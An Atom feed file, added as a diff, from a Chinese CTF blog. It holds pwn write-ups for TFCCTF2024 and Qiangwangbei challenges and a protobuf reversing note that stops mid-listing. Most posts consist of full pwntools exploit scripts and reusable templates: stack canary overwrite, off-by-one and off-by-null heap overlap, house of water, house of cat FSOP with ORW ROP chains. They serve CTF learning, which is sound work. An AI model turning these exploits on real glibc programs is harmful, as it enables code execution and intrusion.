@@ -1,0 +1,1465 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://l1u66.github.io/</id>
+    <title>L1u66&apos;s blog</title>
+    <updated>2024-08-08T16:43:46.347Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://l1u66.github.io/"/>
+    <link rel="self" href="https://l1u66.github.io/atom.xml"/>
+    <subtitle>世间万般兵刃，唯有过往伤人最深</subtitle>
+    <logo>https://l1u66.github.io/images/avatar.png</logo>
+    <icon>https://l1u66.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, L1u66&apos;s blog</rights>
+    <entry>
+        <title type="html"><![CDATA[TFCCTF2024]]></title>
+        <id>https://l1u66.github.io/post/tfcctf2024/</id>
+        <link href="https://l1u66.github.io/post/tfcctf2024/">
+        </link>
+        <updated>2024-08-08T14:58:32.000Z</updated>
+        <content type="html"><![CDATA[<p>打的第一场国外的比赛，从易到难</p>
+<h1 id="guard-the-bypass">GUARD-THE-BYPASS</h1>
+<p>该题逻辑很简单，就是创建了一个新进程，新进程中有一个可以自定义长度输入的栈溢出，程序还开了canary，由于程序只有一个read，所以泄露canary不太可能，溢出长度自定，所以可以溢出到fs段改写canary，唯一注意的点是覆写的canary需要是个可写的地址（调试出来的），后面就是正常的栈溢出</p>
+<pre><code>from pwn import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+#io = remote('challs.tfcctf.com',31940)
+io = process(&quot;./guard&quot;)
+elf = ELF(&quot;./guard&quot;)
+libc = elf.libc
+#io = remote(&quot;&quot;,)
+
+io.sendlineafter(b'chall.\n',b'1')
+io.sendlineafter(b'len: ',b'10000')
+
+puts_plt = 0x0000000004010D0
+puts_got = 0x000000000404018
+rdi_ret = 0x0000000000401256
+ret = 0x000000000040101a
+data = 0x404280
+d = p64(data)*7 + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(0x00000000040136F)
+d += ((0x850 - len(d))//8) * p64(data)
+io.sendline(d)
+
+ogg = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
+puts = u64(io.recv(6).ljust(8,b&quot;\x00&quot;))
+libc_base = puts - libc.sym['puts']
+print(&quot;libc_base&quot;,hex(libc_base))
+
+d = p64(data)*7 + p64(ret) + p64(libc_base + ogg[5])
+io.sendline(d)
+
+io.interactive()
+</code></pre>
+<h1 id="vspmoff-by-one">VSPM(off by one)</h1>
+<p><s>看题目还以为是VM</s>结果是个2.30的堆，具有add,delete,show功能，漏洞点在add功能，可以多输入一个字节,可以做到堆重叠，这版本还有hook，好打的一批</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+p = process(&quot;./chall&quot;)
+#p = remote('challs.tfcctf.com',32662)
+elf = ELF(&quot;./chall&quot;)
+
+def add(size,content1=b'\x00',content2=b'\x00'):
+	p.recvuntil(&quot;Input: &quot;)
+	p.sendline(&quot;1&quot;)
+	p.recvuntil(&quot;length: &quot;)
+	p.sendline(str(size))
+	p.recvuntil(&quot;credentials: &quot;)
+	p.send(content1)
+	p.recvuntil(&quot;credentials: &quot;)
+	p.send(content2)
+    
+def dele(idx):
+	p.recvuntil(&quot;Input: &quot;)
+	p.sendline(&quot;3&quot;)
+	p.recvuntil(b&quot;index: &quot;)
+	p.sendline(str(idx))
+	
+def show():
+	p.recvuntil(&quot;Input: &quot;)
+	p.sendline(&quot;2&quot;)
+
+def exit():
+	p.recvuntil(&quot;Input: &quot;)
+	p.sendline(&quot;4&quot;)
+#gdb.attach(p,$rebase'0x178B')	
+add(0x78)#0
+add(0x78)#1
+add(0x68)#2
+add(0x78)#3
+dele(0)
+pay = b'a'*0x78 + p8(0xf1)
+add(0x78,pay)
+dele(1)
+add(0x78)#0
+show()
+p.recv(0x91)
+main = u64(p.recv(6).ljust(8,b'\x00'))
+base = main - 3886016
+print(hex(main))
+add(0x68)#1
+dele(0)
+dele(2)
+pay = b'a'*0x78 + p8(0xf1)
+add(0x78,pay)
+dele(1)
+add(0x58,b'a'*0x58)
+
+onegadget = [0xc4dbf,0xc4ddf,0xc4de6,0xe1fa1]
+one_gadget = base + onegadget[3]
+malloc_hook = main - 88 - 0x18
+fake_fast = malloc_hook - 35
+print(&quot;one_gadget = &quot;,hex(one_gadget))
+print(&quot;malloc_hook = &quot;,hex(malloc_hook))
+print(&quot;base = &quot;,hex(base))
+print(&quot;fake_fast = &quot;,hex(fake_fast))
+add(0x48,b'b'*24 + p64(0x71) + p64(fake_fast))
+add(0x68)
+payload = b'\x00'*19 + p64(one_gadget)
+add(0x68,payload)
+p.recvuntil(&quot;Input: &quot;)
+p.sendline(&quot;1&quot;)
+#gdb.attach(p)	#----------------------------------------------------------------------------
+p.recvuntil(&quot;length: &quot;)
+p.sendline(str(0x18))
+
+p.interactive()
+</code></pre>
+<h1 id="mcguavahouse-of-water">MCGUAVA（house of water）</h1>
+<p><a href="https://bbs.kanxue.com/thread-282792.htm#msg_header_h3_4">学习链接</a><br>
+重量级来了，真牛批一题，重点分析!!!<br>
+先看功能<br>
+add:<br>
+<img src="https://l1u66.github.io//post-images/1723130644373.png" alt="" loading="lazy"><br>
+可以分配不超过255个堆块，堆块大小必须小于0x6FF，可以在申请的堆块内任意地址写<br>
+delete:<br>
+<img src="https://l1u66.github.io//post-images/1723130760369.png" alt="" loading="lazy"><br>
+存在UAF漏洞，然后就没了......<br>
+整个程序只有个UAF，还只有add和delete功能，<s>这写集贸啊</s>，这时就要用到house of water了</p>
+<h2 id="思考">思考：</h2>
+<p>首先如果要拿到shell或flag，前提是知道libc地址，但是程序没有任何可以泄露地址的功能，所以就想到劫持stdout结构体，但是问题来了，劫持也需要libc地址，所以想到用unsortedbin中的指针残余来得到stdout，低三位是已知的，所以需要爆破第四位，1/16的概率，所以就想如何能够使bin链中存在stdout的地址，house of water给我们提供了一个方法<br>
+众所周知，tcache_perthread_struct 结构体中存放着tcachebin中每一条链表的元素个数和链表头，当你</p>
+<pre><code>    add(0x3e8)#0
+    add(0x3d8)#1
+    free(0)
+    free(1)
+</code></pre>
+<p>tcache_perthread_struct 中会出现<br>
+<img src="https://l1u66.github.io//post-images/1723135416882.png" alt="" loading="lazy"><br>
+<img src="https://l1u66.github.io//post-images/1723132353878.png" alt="" loading="lazy"><br>
+这里以0x30为例，前面可以利用UAF保存到0x5b0142ea8730指针，free后tcache_perthread_struct中的0x30大小的位置就被写上了0x5b0142ea8730，后面就是设法在unsortedbin中构造这样的结构A-&gt;B-&gt;C，B应该就是0x10001这个chunk，需要构造C的bk和A的fd指向那个chunk，在free时已经使B有了fd和bk指针，fd指针即0x5b0142ea8730，所以需要在0x5b0142ea8730处构造一个unsorted大小的chunk，此处又有一个知识点，就是在tcachebin和fastbin中的指针指向的是chunk的内容，即malloc返回的值，在unsortedbin等其他bin中保存的是chunk的头指针，所以如果要在0x5b0142ea8730处构造一个unsorted大小（0x10000-0x17ff0范围以外）的chunk就要想办法free(0x5b0142ea8740)，前提是把0x5b0142ea8738的位置写入一个unsortedbin大小范围内的size值，并且这个size还要合法，即该chunk的地址加上size需要是另一个chunk头，并且这个另一个chunk的size的末尾需要是1，表明这个chunk没被释放过，利用UAF实现堆覆盖可以成功构造，这里也是第四位需要爆破，1/16的概率，构造成功的效果如下<br>
+<img src="https://l1u66.github.io//post-images/1723133842161.png" alt="" loading="lazy"><br>
+这里的0x615c78e5c080即那个0x10001大小的chunk，此时再随便申请一个大小的堆块，便可以把这个大chunk整到largebin中，使原来的fd和bk指针变为和libc有关的地址<img src="https://l1u66.github.io//post-images/1723134055275.png" alt="" loading="lazy">此时在这个大堆中申请堆块即可控制tcache_perthread_struct实现任意地址分配，此时爆破stdout的地址，使能够分配到stdout结构体，实现劫持泄露libc地址，由于程序有exit（0）的功能，可以打FSOP，有了libc地址后就可以通过劫持stderr拿到shell</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+
+context(arch='amd64', os='linux', log_level='debug')
+
+ 
+def meau(index):
+    p.recvuntil('*&gt;',timeout = 1)
+    p.sendline(str(index))
+ 
+def add(size,index=0,content=b'a'):#0x1790
+    meau(1)
+    p.recvuntil('how many guavas:')
+    p.sendline(str(size))
+    p.recvuntil('guavset:',timeout=1)
+    p.sendline(str(index))
+    p.recvuntil('guavas:')
+    p.send(content)
+ 
+def free(index):
+    meau(2)
+    p.recvuntil('guava no:')
+    p.sendline(str(index))
+while True:
+    p = process('./guava')
+    elf = ELF('./guava')
+    libc = elf.libc
+    add(0x600)#0
+    add(0x600)#1
+    add(0x600)#2
+    add(0x600)#3
+    add(0x600)#4
+    add(0x600)#5
+    add(0x600)#6
+    free(0)
+    free(1)
+    free(2)
+    free(3)
+    free(4)
+    free(5)
+    add(0x488)#7
+    add(0x488)#8  fake1 0x30
+    add(0x498)#9
+    add(0x488)#10  fake2 0x20
+    free(7)
+    free(8)
+    free(9)
+    free(10)
+
+    add(0x498,0x488,p64(0x31))#11
+    add(0x488)#12   end
+    add(0x498,0x488,p64(0x21))#13
+    add(0x488)#14 start
+    free(11)
+    free(12)
+    free(13)
+    free(14)
+    free(8)
+    free(10)
+
+    add(0x3e8)#15
+    add(0x3d8,0xa8,p64(0xdc1))#16
+    add(0x608,0x5f8,p64(0x6b1))#17
+    add(0x608)#18
+    add(0x698)#19
+    add(0x698)#20
+    add(0x328)#21
+    add(0x488)#22 middle
+    add(0x328)#23
+    free(15)
+    free(16)
+    free(17)
+    free(18)
+    free(19)
+    free(20)
+    add(0x578)#24
+    add(0x200)#25
+    add(0x308)#26
+    add(0x200)#27
+    add(0x200)#28
+    add(0x200)#29
+    add(0x200)#30
+    add(0x678)#31
+    for i in range(33):
+        add(0x5f8)
+    add(0x5c0,0x5b0,p64(0x10000)+p64(0x440))#65
+    add(0x420)#66
+    free(25)
+    free(14)
+    free(22)
+    free(12)
+    add(0x200,0x88,p16(0xc080))#67
+    add(0x3d8,0xb0,p16(0xc080))#68
+    free(67)
+    free(68)
+    gdb.attach(p,&quot;b *$rebase(0x0000000000015F1)&quot;)
+    try:
+            add(0x500) # 69
+    except:
+            p.close()
+            continue
+    add(0x198)# 70
+    add(0x680)# 71
+    add(0x680)# 72
+    add(0x98)# 73
+    add(0x90,0x8,p16(0xb780)) # 74
+    try:
+        add(0x28,0,p64(0xfbad1800)+p64(0)*3+b'\x00\xb0') # 75
+    except:
+        p.close()
+        continue
+    p.recvuntil(b'\xf0')
+    p.recv(7)
+    libc_base = u64(p.recv(6).ljust(8,b'\x00')) - 2207728
+ 
+    print(hex(libc_base))
+ 
+    # 令 size 为 0x250 的 tcache 指向 _IO_2_1_stderr_
+    add(0x100,0x58,p64(libc_base+libc.symbols['_IO_2_1_stderr_'])) # 76
+ 
+    fake_file = flat({
+        0x0: b&quot;  sh;&quot;,
+        0x28: libc_base + libc.symbols['system'],
+        0x88: libc_base + libc.symbols['_environ']-0x10,
+        0xa0: libc_base+libc.symbols['_IO_2_1_stderr_']-0x40,   # _wide_data
+        0xD8: libc_base + libc.symbols['_IO_wfile_jumps'], # jumptable
+    }, filler=b&quot;\x00&quot;)
+ 
+    # 在 _IO_2_1_stderr_ 上写上我们的 fake file
+    add(0x200,0,fake_file)
+     
+    # 退出程序，执行 fsop 攻击
+    meau(3)
+    p.sendline(b'cat flag.txt')
+ 
+    p.interactive()
+    break
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[高版本off by null]]></title>
+        <id>https://l1u66.github.io/post/gao-ban-ben-off-by-null/</id>
+        <link href="https://l1u66.github.io/post/gao-ban-ben-off-by-null/">
+        </link>
+        <updated>2024-08-08T00:35:04.000Z</updated>
+        <content type="html"><![CDATA[<p>板子：</p>
+<pre><code>#构造堆风水
+    add(0,0x430)
+    add(1,0x20)
+    add(2,0x430)
+    add(3,0x430)
+    add(4,0x28)
+    add(5,0x430)
+    add(6,0x430)
+    add(7,0x30)
+    dele(0)
+    dele(3)
+    dele(6)
+    dele(2)
+    add(2,0x870)
+    add(6,0x430)
+    add(0,0x430)
+    dele(2)
+    #利用堆残留进行堆指针构造
+    add(2,0x450,b'a'*0x438+p32(0x471))
+    add(3,0x410)
+    dele(0)
+    dele(3)
+    add(0,0x430,b'a'*8)
+    dele(6)
+    dele(5)
+    add(5,0x870,b'a'*0x438+p64(0x441))
+    dele(5)
+    add(5,0x4f0)
+    add(6,0x370)
+    edit(4,b'a'*0x20+p64(0x30+0x440))
+    dele(5)
+    #此时offbynull利用成功，4号堆块被重叠了
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[强网杯]house of cat]]></title>
+        <id>https://l1u66.github.io/post/qiang-wang-bei-house-of-cat/</id>
+        <link href="https://l1u66.github.io/post/qiang-wang-bei-house-of-cat/">
+        </link>
+        <updated>2024-08-05T15:46:14.000Z</updated>
+        <content type="html"><![CDATA[<p>可以说是IO+orw的板子题了，这题是main函数内一直循环，无法通过main函数的正常退出或exit来执行_IO_flush_all_lockp函数刷新文件流，根据house of KIWI，在malloc.c中，assert断言失败，最终都会调用<code>__malloc_assert</code> ，而其中有一个fflush (stderr)的函数调用，会走<code>stderr</code>的IO_FILE，最终会调用到其vtable中_IO_file_jumps中的__IO_file_sync，此时rdx为IO_helper_jumps</p>
+<h1 id="触发io">触发IO</h1>
+<p>FSOP有三种情况（能从main函数中返回、程序中能执行exit函数、libc中执行abort），第三种情况在高版本中已经删除;__malloc_assert则是在malloc中触发，通常是修改top chunk的大小。</p>
+<h1 id="__malloc_assert">__malloc_assert</h1>
+<p>house of kiwi提供了一种调用该函数的思路，可以通过修改topchunk的大小触发，即满足下列条件中的一个<br>
+1.topchunk的大小小于MINSIZE(0X20)<br>
+2.prev inuse位为0<br>
+3.old_top页未对齐</p>
+<pre><code>assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||
+        ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;
+         prev_inuse (old_top) &amp;&amp;
+         ((unsigned long) old_end &amp; (pagesize - 1)) == 0));
+</code></pre>
+<h1 id="题目信息">题目信息</h1>
+<p>(<s>省去了逆向内容，主要是学习板子</s>)该题提供了UAF漏洞和两次edit，限制了堆块数目不超过15个，限制了堆块大小[0x418,0x470)，开了沙盒只能orw且read的第一个参数只能是0，所以需要先close(0)，再open，并且限制了edit的输入大小（不超过0x30）,所以只能提前用add布置好fake io和rop链</p>
+<h1 id="劫持的调用链">劫持的调用链：</h1>
+<p>__malloc_assert<br>
+---&gt;__fxprintf<br>
+-------&gt;_IO_wfile_jumps的vtable<br>
+-----------&gt;_IO_wfile_seekoff<br>
+---------------&gt;_IO_switch_to_wget_mode</p>
+<h1 id="攻击思路house-of-cat">攻击思路（house of cat）：</h1>
+<p>通过第一次largebin attack劫持stderr，然后控制vtable为_IO_wfile_jumps+0x10，劫持_IO_wfile_seekoff为magic_gadget，将rbp转移到rop上，然后利用call调用leave ret执行rop链，最后通过第二次llargebin attack部分改写top chunk（将其改小），然后调用malloc即可触发__malloc_assert打印出flag</p>
+<pre><code>from pwn import *
+context.log_level = 'debug'
+context(arch='amd64', os='linux')
+
+#p = remote('43.142.108.3', 28290)
+p = process('./house_of_cat')
+elf = ELF('./house_of_cat')
+libc = elf.libc
+
+
+def s(x): return p.send(x)
+def sa(x, y): return p.sendafter(x, y)
+def sla(x, y): return p.sendlineafter(x, y)
+def sl(x): return p.sendline(x)
+def rv(): return p.recv()
+def ru(x): return p.recvuntil(x)
+def rvl(): return p.recvline()
+def lg(x, y): return log.info(f'{x} =&gt; {hex(y)}')
+
+
+sa(b'mew mew mew~~~~~~', b'LOGIN | r00t QWB QWXFadmin')
+
+
+def add(idx, size, data = b'\x00'):  # [0x418,0x470)
+    sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
+    sla('plz input your cat choice:\n', b'1')
+    sla('plz input your cat idx:\n', str(idx))
+    sla('plz input your cat size:\n', str(size))
+    sa('plz input your content:\n', data)
+
+
+def delete(idx):  # uaf
+    sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
+    sla('plz input your cat choice:\n', b'2')
+    sla('plz input your cat idx:\n', str(idx))
+
+
+def show(idx):
+    sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
+    sla('plz input your cat choice:\n', b'3')
+    sla('plz input your cat idx:\n', str(idx))
+
+
+def edit(idx, data):
+    sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
+    sla('plz input your cat choice:\n', b'4')
+    sla('plz input your cat idx:\n', str(idx))
+    sa('plz input your content:\n', data)
+
+
+add(0xe,0x450,'a')
+add(0xd,0x450,'a')
+delete(0xe)
+add(0xc,0x460,'a')
+show(0xe)
+p.recvuntil('Context:\n')
+p.recv(8)
+libc_base=u64(p.recv(6).ljust(8, b'\0'))-0x21a0e0
+p.recv(10)
+large = u64(p.recv(6).ljust(8,b'\x00'))
+heap_base=large-0x290
+IO_list_all=libc_base+libc.symbols['_IO_list_all']
+magic_gadget=libc_base+0x16a1fa
+&quot;&quot;&quot;
+&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]
+&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]
+&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]
+&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0
+&lt;svcudp_reply+45&gt;:    mov    rdi,r13
+&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]
+&quot;&quot;&quot;
+leave_ret=libc_base+0x00000000000562ec
+add_rsp_ret=libc_base+0x000000000003a889
+stderr_ptr=0x21a860+libc_base
+lock=libc_base+0x21ba60
+pop_rdi=libc_base+0x000000000002a3e5
+pop_rsi=libc_base+0x000000000002be51
+pop_rdx_r12=libc_base+0x000000000011f497
+pop_rax_ret=libc_base+0x0000000000045eb0
+ret = libc_base+0x0000000000029cd6
+syscall=libc_base+0xea5b9
+read_addr=libc_base+libc.symbols['read']
+write_addr=libc_base+libc.symbols['write']
+close_addr=libc_base+libc.symbols['close']
+
+add(0xb,0x450,'a')
+
+fake_io_addr = heap_base + 0xfc0
+flag_str_addr = fake_io_addr + 0x1a8
+flag_content_addr = heap_base + 0x600
+setcontext = libc_base + libc.sym['setcontext']
+_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
+rop_chain = p64(pop_rdi) + p64(flag_str_addr) + p64(libc.sym['open']) #open(&quot;./flag.txt&quot;,0);
+rop_chain += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_content_addr) + p64(pop_rdx_r12) + p64(0x50) + p64(0) + p64(libc.sym['read'])#read(3,flag_addr2,0x50);
+rop_chain += p64(pop_rdi) + p64(1) + p64(libc.sym['write'])#write(1,flag_addr2,0x50);
+
+
+#close
+rop=p64(pop_rdi)
+rop+=p64(0)
+rop+=p64(close_addr)
+
+#open
+rop+=p64(pop_rdi)
+rop+=p64(flag_str_addr)# 'flag' address
+rop+=p64(pop_rsi)
+rop+=p64(0)
+rop+=p64(pop_rax_ret)
+rop+=p64(2)
+rop+=p64(syscall)
+
+#read
+rop+=p64(pop_rdi)
+rop+=p64(0)
+rop+=p64(pop_rsi)
+rop+=p64(flag_content_addr)# flag store address
+rop+=p64(pop_rdx_r12)
+rop+=p64(0x50)
+rop+=p64(0)
+rop+=p64(read_addr)
+
+#write
+rop+=p64(pop_rdi)
+rop+=p64(1)
+rop+=p64(pop_rsi)
+rop+=p64(flag_content_addr)# flag store address
+rop+=p64(pop_rdx_r12)
+rop+=p64(0x50)
+rop+=p64(0)
+rop+=p64(write_addr)
+
+
+fake_stderr = flat({
+    0x38: p64(fake_io_addr+0x1f0),
+    0x78: p64(lock),
+    0x90: p64(fake_io_addr+0xe0),
+    0xc8: p64(_IO_wfile_jumps + 0x10),
+    0xf0: p64(1),
+    0x198: b&quot;flag\x00\x00\x00\x00&quot;,
+    0x1b0: p64(fake_io_addr+0x1b0),
+    0x1b8: p64(magic_gadget),
+    0x1e0: p64(0xdeadbeef),
+    0x1e8: p64(add_rsp_ret),
+    0x1f0: p64(0xdeadbeef),
+    0x1f8: p64(0x1e8+fake_io_addr),
+    0x200: p64(leave_ret),
+    #rop
+    0x208:rop
+},filler=b'\00')
+
+
+# fake_io_addr = heap_base + 0xfc0
+# wide_data=p64(0)*4+p64(1)
+# wide_data+=p64(0)*20
+# wide_data+=b&quot;flag\x00\x00\x00\x00&quot;
+# wide_data+=p64(0)
+# wide_data+=p64(0)
+# wide_data+=p64(fake_io_addr+0x1b0)#wide_vtable
+# wide_data+=p64(magic_gadget)#first call
+# wide_data+=p64(0)*3
+# wide_data+=p64(0)#                        rax即0x1178+0x30+heap_base
+# wide_data+=p64(0xdeadbeef)#                   rbp即heap_base+0x1180+0x30
+# wide_data+=p64(add_rsp_ret)      #        add    rsp,0x18
+# wide_data+=p64(0xdeadbeef)
+# wide_data+=p64(0x1e8+fake_io_addr)#   [rbp+0x18]  
+# wide_data+=p64(leave_ret)          #second call  [rax+0x28]
+# wide_data+=rop
+
+
+# io_file=p64(0)*7
+# io_file+=p64(fake_io_addr+0x1f0)#  rbp   io_save_base   [rdi+0x48]   
+# io_file+=p64(0)*7
+# io_file+=p64(lock)+p64(0)*2
+# io_file+=p64(fake_io_addr+0xe0)#wide_data
+# io_file+=p64(0)*6
+# io_file+=p64(libc_base+0x2160c0+0x10)#vtable   _IO_wfile_jumps+0x10
+# io_file+=wide_data
+
+
+
+add(0,0x428,fake_stderr)#0xwfile 2160c0
+add(0xf,0x460,'prevent merge chunk')
+add(1,0x418,'a')
+delete(0)
+add(2,0x460,'a')
+edit(0,p64(libc_base+0x21a0d0)*2+p64(0)+p64(stderr_ptr-0x20))
+delete(1)
+add(3,0x440,'large bin attack chunk')
+
+add(4,0x418,'a')
+print('libc_base',hex(libc_base))
+print('heap_base',hex(heap_base))
+print('stderr_ptr',hex(stderr_ptr))
+print('_IO_wfile_jumps',hex(_IO_wfile_jumps + 0x10))
+print('fake_io_addr',hex(fake_io_addr))
+gdb.attach(p)
+
+
+# second large bin attack
+add(7,0x460,'a')
+add(8,0x430,'a')
+
+delete(3)
+add(9,0x460,'a')
+edit(3,p64(large)+p64(large)+p64(0)+p64(0x3265-2+heap_base-0x20))
+delete(8)
+
+p.sendafter(&quot;mew mew mew~~~~~~\n&quot;,'CAT | r00t QWB QWXF$\xff')
+p.sendlineafter(&quot;plz input your cat choice:\n&quot;,str(1))
+p.sendlineafter(&quot;plz input your cat idx:\n&quot;,str(6))
+p.sendlineafter(&quot;plz input your cat size:\n&quot;,str(0x46f))
+p.interactive()
+</code></pre>
+<h1 id="板子">板子：</h1>
+<pre><code>magic_gadget=libc_base+0x16a1fa
+&quot;&quot;&quot;
+&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]
+&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]
+&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]
+&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0
+&lt;svcudp_reply+45&gt;:    mov    rdi,r13
+&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]
+&quot;&quot;&quot;
+fake_io_addr = heap_base + 0xfc0
+flag_str_addr = fake_io_addr + 0x1a8
+flag_content_addr = heap_base + 0x600
+setcontext = libc_base + libc.sym['setcontext']
+_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
+rop_chain = p64(pop_rdi) + p64(flag_str_addr) + p64(libc.sym['open']) #open(&quot;./flag.txt&quot;,0);
+rop_chain += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_content_addr) + p64(pop_rdx_r12) + p64(0x50) + p64(0) + p64(libc.sym['read'])#read(3,flag_addr2,0x50);
+rop_chain += p64(pop_rdi) + p64(1) + p64(libc.sym['write'])#write(1,flag_addr2,0x50);
+
+#close
+rop=p64(pop_rdi)
+rop+=p64(0)
+rop+=p64(close_addr)
+
+#open
+rop+=p64(pop_rdi)
+rop+=p64(flag_str_addr)# 'flag' address
+rop+=p64(pop_rsi)
+rop+=p64(0)
+rop+=p64(pop_rax_ret)
+rop+=p64(2)
+rop+=p64(syscall)
+
+#read
+rop+=p64(pop_rdi)
+rop+=p64(0)
+rop+=p64(pop_rsi)
+rop+=p64(flag_content_addr)# flag store address
+rop+=p64(pop_rdx_r12)
+rop+=p64(0x50)
+rop+=p64(0)
+rop+=p64(read_addr)
+
+#write
+rop+=p64(pop_rdi)
+rop+=p64(1)
+rop+=p64(pop_rsi)
+rop+=p64(flag_content_addr)# flag store address
+rop+=p64(pop_rdx_r12)
+rop+=p64(0x50)
+rop+=p64(0)
+rop+=p64(write_addr)
+fake_stderr = flat({
+    0x38: p64(fake_io_addr+0x1f0),#  rbp   io_save_base   [rdi+0x48]   
+    0x78: p64(lock),
+    0x90: p64(fake_io_addr+0xe0),#wide_data
+    0xc8: p64(_IO_wfile_jumps + 0x10),#vtable   _IO_wfile_jumps+0x10
+    0xf0: p64(1),
+    0x198: b&quot;flag\x00\x00\x00\x00&quot;,
+    0x1b0: p64(fake_io_addr+0x1b0),#wide_vtable
+    0x1b8: p64(magic_gadget),#first call
+    0x1e0: p64(0xdeadbeef),#                   rbp即heap_base+0x1180+0x30
+    0x1e8: p64(add_rsp_ret), #add    rsp,0x18
+    0x1f0: p64(0xdeadbeef),
+    0x1f8: p64(0x1e8+fake_io_addr),#   [rbp+0x18]  
+    0x200: p64(leave_ret), #second call  [rax+0x28]
+    #rop
+    0x208:rop
+},filler=b'\00')
+</code></pre>
+<p>另一种形式</p>
+<pre><code>fake_io_addr = heap_base + 0xfc0
+
+wide_data=p64(0)*4+p64(1)
+wide_data+=p64(0)*20
+wide_data+=b&quot;flag\x00\x00\x00\x00&quot;
+wide_data+=p64(0)
+wide_data+=p64(0)
+wide_data+=p64(fake_io_addr+0x1b0)#wide_vtable
+wide_data+=p64(magic_gadget)#first call
+wide_data+=p64(0)*3
+wide_data+=p64(0)#                        rax即0x1178+0x30+heap_base
+wide_data+=p64(0xdeadbeef)#                   rbp即heap_base+0x1180+0x30
+wide_data+=p64(add_rsp_ret)      #        add    rsp,0x18
+wide_data+=p64(0xdeadbeef)
+wide_data+=p64(0x1e8+fake_io_addr)#   [rbp+0x18]  
+wide_data+=p64(leave_ret)          #second call  [rax+0x28]
+wide_data+=rop
+
+
+io_file=p64(0)*7
+io_file+=p64(fake_io_addr+0x1f0)#  rbp   io_save_base   [rdi+0x48]   
+io_file+=p64(0)*7
+io_file+=p64(lock)+p64(0)*2
+io_file+=p64(fake_io_addr+0xe0)#wide_data
+io_file+=p64(0)*6
+io_file+=p64(libc_base+0x2160c0+0x10)#vtable   _IO_wfile_jumps+0x10
+io_file+=wide_data
+</code></pre>
+<p>详细参数版：</p>
+<pre><code>fake_struct = p64(0) #_IO_read_end
+fake_struct += p64(0) #_IO_read_base
+fake_struct += p64(0) #_IO_write_base
+fake_struct += p64(0) #_IO_write_ptr
+fake_struct += p64(0) #_IO_write_end
+fake_struct += p64(0) #_IO_buf_base
+fake_struct += p64(1) #_IO_buf_end
+fake_struct += p64(0) #_IO_save_base
+fake_struct += p64(fake_io_addr + 0xb0) #_IO_backup_base = rdx
+fake_struct += p64(setcontext + 61) #_IO_save_end = call_addr
+fake_struct += p64(0)  #_markers
+fake_struct += p64(0)  #_chain
+fake_struct += p64(0)  #_fileno
+fake_struct += p64(0)  #_old_offset
+fake_struct += p64(0)  #_cur_column
+fake_struct += p64(heap_base + 0x200) #_lock = heap_addr or writeable libc_addr
+fake_struct += p64(0) #_offset
+fake_struct += p64(0) #_codecvx
+fake_struct += p64(fake_io_addr + 0x30) #_wfile_data rax1
+fake_struct += p64(0) #_freers_list
+fake_struct += p64(0) #_freers_buf
+fake_struct += p64(0) #__pad5
+fake_struct += p32(0) #_mode
+fake_struct += b&quot;\x00&quot;*20 #_unused2
+fake_struct += p64(_IO_wfile_jumps + 0x10) #vatable
+fake_struct += p64(0)*6 #padding
+fake_struct += p64(fake_io_addr + 0x40) #rax2 -&gt; to make [rax+0x18] = setcontext + 61
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[protobuf]]></title>
+        <id>https://l1u66.github.io/post/protobuf/</id>
+        <link href="https://l1u66.github.io/post/protobuf/">
+        </link>
+        <updated>2024-07-30T10:58:16.000Z</updated>
+        <content type="html"><![CDATA[<p><a href="https://zzkkk1h.github.io/wp/ciscn2024%E5%88%9D%E8%B5%9B-Pwn-wp/index.html">学习链接</a><br>
+例题为ciscn2024初赛的ezbuf</p>
+<h1 id="pbtk逆向协议">pbtk逆向协议</h1>
+<pre><code>cd pbtk
+./gui.py
+</code></pre>
+<p>选择第一个选项</p>
+<h1 id="手动逆向协议">手动逆向协议</h1>
+<p>魔数：0x28AAEEF9<br>
+恢复的结构体（选中数据,alt+Q）：<br>
+<img src="https://l1u66.github.io//post-images/1722338352659.png" alt="" loading="lazy"><br>
+如果n_fileds为5,表明其中含有5个变量，点进fields分析每个field</p>
+<pre><code>typedef enum {
+	PROTOBUF_C_TYPE_INT32,      /**&lt; int32 */
+	PROTOBUF_C_TYPE_SINT32,     /**&lt; signed int32 */
+	PROTOBUF_C_TYPE_SFIXED32,   /**&lt; signed int32 (4 bytes) */
+	PROTOBUF_C_TYPE_INT64,      /**&lt; int64 */
+	PROTOBUF_C_TYPE_SINT64,     /**&lt; signed int64 */
